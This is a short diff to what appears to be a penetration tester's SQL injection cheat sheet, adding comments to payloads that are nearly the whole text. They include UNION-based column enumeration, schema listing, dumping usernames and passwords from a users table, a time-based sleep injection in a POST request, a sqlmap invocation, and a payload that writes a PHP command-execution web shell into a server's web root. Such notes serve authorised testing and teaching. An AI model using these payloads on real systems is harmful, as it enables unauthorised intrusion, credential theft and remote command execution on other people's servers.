@@ -1095,23 +1095,27 @@ https://book.hacktricks.xyz/pentesting-web/sql-injection
 
 # Enumeration
 
-' ORDER BY 1--
-' UNION SELECT NULL,NULL,NULL--
-' UNION SELECT NULL,NULL,'a',NULL-- #Define string data
+' ORDER BY 1--      #Increase the number to determine the number of columns
+' UNION SELECT NULL,NULL,NULL--   #Confirm the "Order by" statement 
+' UNION SELECT NULL,NULL,'a',NULL-- #Define string/numerical data
 
 # Database Attacks
 '+UNION+SELECT+@@version,+NULL#
 SELECT * FROM information_schema.tables
+
 '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--  #List Tables
+
 '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--  #List Columns
+
 '+UNION+SELECT+username,+password+FROM+users--    #Get Username & Password
+
 '+UNION+SELECT+NULL,username||'~'||password+FROM+users--     #Concatenation for multiple vaules
 
 # SQL Web Shell
 'UNION SELECT ("<?php echo passthru($_GET['cmd'];") INTO OUTFILE 'C:/xampp/htdocs/command.php'>) #MedJed
 
 # Post
-./sqlmap.py -r search-test.txt -p tfUPass
+./sqlmap.py -r search-test.txt -p tfUPass  #<-p> is the parameter to test in the file
 [From Burp to confirm] POST /issue/checkByPriority?priority=Normal'+UNION+SELECT+sleep(5);+--+- HTTP/1.1
 
 # Get
